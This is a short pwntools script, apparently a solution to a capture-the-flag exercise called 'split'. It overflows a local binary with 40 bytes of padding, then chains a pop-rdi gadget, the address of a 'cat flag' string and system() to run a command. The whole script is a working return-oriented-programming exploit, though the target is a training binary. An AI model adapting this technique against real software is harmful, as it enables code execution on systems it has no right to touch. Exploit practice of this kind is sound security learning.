from pwn import *
p = process("./split")

offset = '\41' * 40
pop_rdi = p64(0x400883) 
cat_flag = p64(0x601065)
system = p64(0x4005e0)

rop = offset  + pop_rdi + cat_flag + system 

i = 0
while i < 3:
    print(p.recvline())
    i = i + 1 

p.sendline(rop)
print(p.recvline())
print(p.recvline())
